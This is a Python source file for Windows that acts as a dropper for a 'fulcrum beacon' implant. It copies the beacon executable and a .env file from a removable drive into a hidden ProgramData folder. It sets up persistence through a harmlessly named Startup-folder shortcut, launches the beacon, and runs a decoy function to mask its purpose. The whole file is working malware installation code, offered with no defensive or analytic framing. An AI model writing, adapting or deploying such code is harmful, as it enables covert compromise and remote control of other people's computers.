import os
from win32com.client import Dispatch
import ctypes
import shutil


FLAG_PATH = "C:\\ProgramData\\FUC Cache"
INSTALL_PATH = "C:\\ProgramData\\FUC HUB"

BEACON_FILE_NAME = "fulcrum_beacon.exe"   # like fulcrum_beacon.exe

START_FOLDER = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')


def check_flags():
    if os.path.isdir(FLAG_PATH):
        return True
    return False


def create_shortcut(shortcut_path, target_path):
    # creating a windows shortcut
    try:
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = target_path
        shortcut.WorkingDirectory = os.path.dirname(target_path)
        shortcut.save()
    except:
        pass

def decoy_function():
    # add some code that acts as a decoy / maybe tic-tac-toe or sum
    print("hello world")


def main():
    if not check_flags():

        # create new hidden path
        os.mkdir(INSTALL_PATH)
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(INSTALL_PATH, FILE_ATTRIBUTE_HIDDEN)

        # copy fulcrum beacon file
        if os.path.isfile("D:\\.env"):
            shutil.copy("D:\\" + BEACON_FILE_NAME, INSTALL_PATH)
        else:
            shutil.copy("E:\\" + BEACON_FILE_NAME, INSTALL_PATH)
        # copy .env file
        if os.path.isfile("D:\\.env"):
            shutil.copy("D:\\.env", INSTALL_PATH)
        else:
            shutil.copy("E:\\.env", INSTALL_PATH)

        # add the file to startup using a shortcut in the startup folder
        create_shortcut(os.path.join(START_FOLDER, "START_MENU.lnk"),
                        os.path.join(INSTALL_PATH, BEACON_FILE_NAME))

        # execute shortcut
        os.startfile(os.path.join(START_FOLDER, "START_MENU.lnk"))



if __name__ == '__main__':
    main()              # installer
    decoy_function()    # decoy code
